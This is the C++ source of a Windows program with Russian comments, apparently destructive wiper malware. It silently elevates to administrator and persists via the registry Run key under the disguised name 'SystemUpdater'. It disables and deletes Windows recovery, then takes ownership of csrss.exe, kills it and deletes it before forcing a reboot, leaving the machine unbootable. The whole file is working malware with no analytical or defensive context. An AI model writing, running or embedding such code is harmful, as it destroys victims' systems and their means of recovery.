#include <windows.h>
#include <shellapi.h>
#include <iostream>
using namespace std;


//Функция проверки прав администратора
bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup);
    CheckTokenMembership(NULL, adminGroup, &isAdmin);
    FreeSid(adminGroup);
    return isAdmin == TRUE;
}

int main() {
    //Скрываем консоль и проверяем есть ли права администратора
    FreeConsole();

    if (!IsAdmin()) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        ShellExecuteA(NULL, "runas", exePath, NULL, NULL, SW_HIDE);
        return 0;
    }

    //Автозарузка
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        RegSetValueExA(hKey, "SystemUpdater", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
    }

    
    //Удаление Recovery и winre.wim
    system("reagentc /disable");
    system("rmdir /s /q C:\\Windows\\System32\\Recovery");

    //Удаление csrss.exe
    system("takeown /f C:\\Windows\\System32\\csrss.exe 2>nul");
    system("icacls C:\\Windows\\System32\\csrss.exe /grant %username%:F 2>nul");
    system("taskkill /f /im csrss.exe 2>nul");
    DeleteFileA("C:\\Windows\\System32\\csrss.exe");

    //Перезагрузка для того чтоб Windows поняла что не хватает файла
    system("shutdown /r /t 10");

    return 0;
}
